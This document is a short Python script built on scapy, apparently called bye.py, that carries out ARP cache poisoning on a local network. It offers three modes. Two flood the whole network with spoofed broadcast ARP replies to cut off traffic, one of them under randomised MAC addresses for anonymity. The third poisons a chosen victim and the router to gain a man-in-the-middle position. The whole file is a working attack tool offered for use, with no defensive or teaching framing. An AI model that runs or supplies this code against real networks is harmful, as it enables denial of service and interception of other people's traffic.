#!/usr/bin/python3
from scapy.all import *
import sys
import subprocess as sb
import os
import random
import time

#MAC of domain broadcast
macBR = "ff:ff:ff:ff:ff:ff"
MAC = ""

if len(sys.argv) < 3:
    print("python3 bye.py <ip-router> <interface> <b or ba or m>\n\nb -> block\nba -> block in anonymous\nm -> man in the middle\n")
    sys.exit()

def macG():
    mac = []
    for x in range(6):
        mac.append(random.randint(0x00,0xff))
    
    return ':'.join(map(lambda x: "%02x" % x, mac))


def arpP(t,g):
    p = ARP(op=2,pdst=t, hwdst=getmacbyip(t),psrc=g)
    send(p)


def poison():
    #get ip router
    ipR = sys.argv[1]
    iface = sys.argv[2]
    #get broadcast domain
    commandBR = f"ifconfig {iface} | grep broadcast | awk " + "'{print $6}'"
    br = sb.check_output(commandBR,shell=True)
    br = br.decode('utf-8')

    #check if the user want to block all network stay in anonymous

    if sys.argv[3] == 'ba':
        print("Block all network in anonymous")
        print("Loading MAC Address...")
        
        try:
                
            while True:
                macRa = macG()
           
                evilP = Ether(dst=macBR, src=macRa)/ARP(op=2, psrc=ipR, pdst=br, hwsrc=macRa, hwdst=macBR)
                sendp(evilP)

        except KeyboardInterrupt:
            print("Exit good luck:>")
            sys.exit(0)

    elif sys.argv[3] == 'b':
        print("Block all traffic ;)")
        sb.check_output("sysctl -w net.ipv4.ip_forward\=0", shell=True)
        #get my mac of interface 
        MAC = get_if_hwaddr(sys.argv[2])
    
    elif sys.argv[3] == 'm':
        print("Man In The Middle ;)")
        sb.check_output("sysctl -w net.ipv4.ip_forward\=1", shell=True)
        ipv = str(input("Ip victim: "))
        
        try:
            
            while True:
                arpP(ipv,ipR)
                arpP(ipR,ipv)
                time.sleep(1)
        except KeyboardInterrupt:
            print("Exit good luck :)")
            sb.check_output("sysctl -w net.ipv4.ip_forward\=0", shell=True)
            sys.exit(0)
        #get my mac of interface 
        MAC = get_if_hwaddr(sys.argv[2])

    else:
        print("Error type b or ba or m")
        sys.exit(0)

    print("start to poisoning all network :|")


    # mac dst = ff:ff:ff:ff:ff:ff mac src = my mac
    # let's to craft the evil packet
    # ARP op =2 -> is at | ARP op =1 -> who is at
    evilP = Ether(dst=macBR, src=MAC)/ARP(op=2, psrc=ipR, pdst=br, hwsrc=MAC, hwdst=macBR)
    try:
        while True:
            sendp(evilP)
    except:
        print("Exit good luck :)")
        sys.exit(0)

if __name__ == "__main__":
    poison()
